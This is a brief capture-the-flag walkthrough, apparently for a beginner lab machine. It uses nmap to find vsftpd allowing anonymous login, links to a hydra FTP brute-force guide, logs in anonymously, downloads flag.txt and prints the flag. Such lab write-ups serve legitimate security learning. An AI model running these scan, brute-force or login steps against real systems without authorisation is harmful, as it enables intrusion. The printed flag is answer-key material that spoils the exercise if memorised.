
nmap scanning:

~~~
nmap 10.129.96.87 -sC -sV  
~~~

~~~
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-07 12:28 EDT
Nmap scan report for 10.129.96.87
Host is up (0.80s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.165
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.23 seconds
~~~

after the nmap scan we found this machine ftp protocol open in 21 port

File transfer protocol (FTP) is **a way to download, upload, and transfer files from one location to another on the Internet and between computer systems**.

brute force in ftp using hydra
https://twriting.medium.com/how-to-brute-force-ftp-ssh-login-and-password-using-hydra-5a5ceaf763f9

exploit ftp by using username  anonymous and the password is blank
~~~
ftp 10.129.96.87
~~~
Connected to 10.129.96.87.
220 (vsFTPd 3.0.3)
Name (10.129.96.87:subhash):*anonymous*
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
~~~
ftp> ls
229 Entering Extended Passive Mode (|||38642|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
226 Directory send OK.
ftp> get flag.txt
local: flag.txt remote: flag.txt
229 Entering Extended Passive Mode (|||13718|)
150 Opening BINARY mode data connection for flag.txt (32 bytes).
100% |***********************************************************************************************************************************************|    32        6.09 KiB/s    00:00 ETA
226 Transfer complete.
32 bytes received in 00:00 (0.11 KiB/s)
ftp> bye
221 Goodbye
~~~

cd  flag.txt      
035db21c881520061c53e0536e44f815


finished !!!!!!!!!!!!